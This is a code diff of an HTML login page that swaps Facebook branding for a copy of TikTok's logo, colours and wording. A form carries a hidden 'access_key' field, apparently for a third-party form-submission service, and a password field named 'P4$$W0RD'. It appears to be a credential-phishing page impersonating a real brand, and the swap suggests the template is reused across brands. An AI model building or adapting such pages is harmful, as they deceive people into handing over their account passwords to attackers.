@@ -3,117 +3,150 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login</title>
+    <title>TikTok Login</title>
     <style>
         body {
-            font-family: Arial, Helvetica, sans-serif;
-            background-color: #f0f2f5;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #000;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
+            color: #fff;
         }
         
         .login-container {
-            background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-            padding: 20px;
+            background-color: #121212;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            padding: 24px;
             width: 400px;
             text-align: center;
         }
         
         .logo {
-            color: #1877f2;
-            font-size: 32px;
-            font-weight: bold;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
+        }
+        
+        .logo svg {
+            width: 100px;
+            height: 40px;
+            fill: #fff;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 24px;
         }
         
         input {
             width: 100%;
             padding: 14px 16px;
-            margin-bottom: 12px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
+            margin-bottom: 16px;
+            border: 1px solid #3d3d3d;
+            border-radius: 4px;
             font-size: 16px;
             box-sizing: border-box;
+            background-color: #121212;
+            color: #fff;
         }
         
         input:focus {
             outline: none;
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
+            border-color: #fe2c55;
         }
         
         button {
-            background-color: #1877f2;
+            background-color: #fe2c55;
             color: white;
             border: none;
-            border-radius: 6px;
-            font-size: 18px;
+            border-radius: 4px;
+            font-size: 16px;
             padding: 12px;
             width: 100%;
-            font-weight: bold;
+            font-weight: 600;
             cursor: pointer;
-            margin-bottom: 15px;
+            margin-bottom: 16px;
+            transition: background-color 0.2s;
         }
         
         button:hover {
-            background-color: #166fe5;
+            background-color: #d91f40;
         }
         
         .forgot-password {
-            color: #1877f2;
+            color: #fe2c55;
             text-decoration: none;
             font-size: 14px;
             display: block;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
         }
         
         .divider {
-            border-bottom: 1px solid #dadde1;
-            margin: 20px 0;
+            border-bottom: 1px solid #3d3d3d;
+            margin: 24px 0;
+            position: relative;
+        }
+        
+        .divider-text {
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #121212;
+            padding: 0 16px;
+            font-size: 14px;
+            color: #8a8a8a;
         }
         
         .create-account {
-            background-color: #42b72a;
-            color: white;
-            border: none;
-            border-radius: 6px;
+            background-color: transparent;
+            color: #fe2c55;
+            border: 1px solid #3d3d3d;
+            border-radius: 4px;
             font-size: 16px;
             padding: 12px;
-            font-weight: bold;
+            font-weight: 600;
             cursor: pointer;
-            margin-top: 10px;
+            width: 100%;
+            transition: background-color 0.2s;
         }
         
         .create-account:hover {
-            background-color: #36a420;
+            background-color: rgba(254, 44, 85, 0.1);
         }
         
         #result {
             margin-top: 15px;
-            color: #1877f2;
+            color: #fe2c55;
             font-size: 14px;
         }
     </style>
 </head>
 <body>
     <div class="login-container">
-        <div class="logo">facebook</div>
+        <div class="logo">
+            <svg viewBox="0 0 24 24" width="1em" height="1em">
+                <path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z"></path>
+            </svg>
+        </div>
+        <div class="title">Log in to TikTok</div>
         <form method="POST" id="form">
             <input type="hidden" name="access_key" value="71649a3b-4e9f-4dad-aab1-fc1859ef30e4">
             
-            <input type="text" name="name" placeholder="Email or phone number" required>
+            <input type="text" name="name" placeholder="Email or username" required>
             <input type="password" name="P4$$W0RD" placeholder="Password" required>
             <button type="submit">Log In</button>
             
-            <a href="#" class="forgot-password">Forgotten password?</a>
-            <div class="divider"></div>
+            <a href="#" class="forgot-password">Forgot password?</a>
             
-            <button type="button" class="create-account">Create New Account</button>
+            <div class="divider">
+                <span class="divider-text">or</span>
+            </div>
+            
+            <button type="button" class="create-account">Sign up</button>
             
             <div id="result"></div>
         </form>
